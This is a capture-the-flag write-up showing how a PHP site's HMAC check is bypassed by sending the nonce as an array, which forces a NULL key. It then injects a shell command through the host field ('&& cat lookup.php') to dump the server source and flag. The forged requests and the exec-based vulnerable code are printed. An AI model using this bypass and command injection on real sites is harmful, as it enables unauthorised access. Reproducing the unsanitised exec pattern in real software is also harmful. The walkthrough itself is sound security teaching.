# Flaky Host writeup

We are presented with a simple website to lookup the host of a domain.
The `host` and `HMAC` field are required. When filling in the fields and submitting them with random data we get the following error:
```
An authentication error has occured!
```

There is also a optional nonce field. When also filling it with random data we receive the same error.

We know that the site is written in PHP. We also know that the `HMAC` is generated with the `host` as input.

When searching for `PHP HMAC` we find the PHP documentation for the `hash_hmac` function.
It has the folowing parameters. `algorithm`, `data` and `key`. 

It's safe to assume that the algorithm is `sha256` or something similar, not feasible to bruteforce. We also do not have the key so we are stuck.

Let's look back at the website. We haven't yet looked at the `nonce` but we probably have to use that. The flavortext tells us that friends may access the website also. The nonce is thus used as a `key`. The nonce can't just be used a `key` because this would allow to just enter anything. So the `key` is probably the HMAC of the nonce.

Let's look at `hash_hmac` vulnerabilities. After some searching we find that entering an array as data, `hash_hmac` will return `NULL`;
This is really helpful because that means that we can generate the HMAC of host ourselves because the key will be NULL.

We generate the HMAC of `example.org`:
```php
hash_hmac('sha256', 'example.org', NULL);
# 63d83b26b3803459afbc44c1439eed5e94113101b82b7f71d29103b139674c7f
```
So we edit the POST request like this:
```
host=example.org&hmac=63d83b26b3803459afbc44c1439eed5e94113101b82b7f71d29103b139674c7f&nonce[]
```

Or when encoded
```
host=example.org&hmac=63d83b26b3803459afbc44c1439eed5e94113101b82b7f71d29103b139674c7f&nonce%5B%5D=
```
Make sure to remove the `Content-Length` header otherwise it won't work.

Success! We receive the following:
```
example.org has address 93.184.216.34
example.org has IPv6 address 2606:2800:220:1:248:1893:25c8:1946
```

So now we can try to exploit the host parameter.

We take as host `example.org && cat lookup.php` and calculate the hmac like so:
```php
echo hash_hmac('sha256', 'example.org && cat lookup.php', null);
# 00dd5be088d0db9fc120681528cba5123040c3f06bf562c8952c80dadd18c49a
```

This is the output we get:
```
example.org has address 93.184.216.34
example.org has IPv6 address 2606:2800:220:1:248:1893:25c8:1946
session_start();

if (empty($_POST['hmac']) || empty ($_POST['host'])) {
$_SESSION['error'] = 'Please enter a Host and key!';
header('Location: /');
exit();
}

$secret = 'FLG{55e650abd14d9069c6a053f606f3925ef8619854feb7}';

if (isset($_POST['nonce'])) {
$secret = hash_hmac('sha256', $_POST['nonce'], $secret);
}

$hmac = hash_hmac('sha256', $_POST['host'], $secret);

if ($hmac !== $_POST['hmac']) {
$_SESSION['error'] = 'An authentication error has occured!';
header('Location: /');
exit();
}
exec("host ".$_POST['host'], $output);
$_SESSION['result'] = $output;
header('Location: /');
exit();
```
As we can see, the secret is the flag.
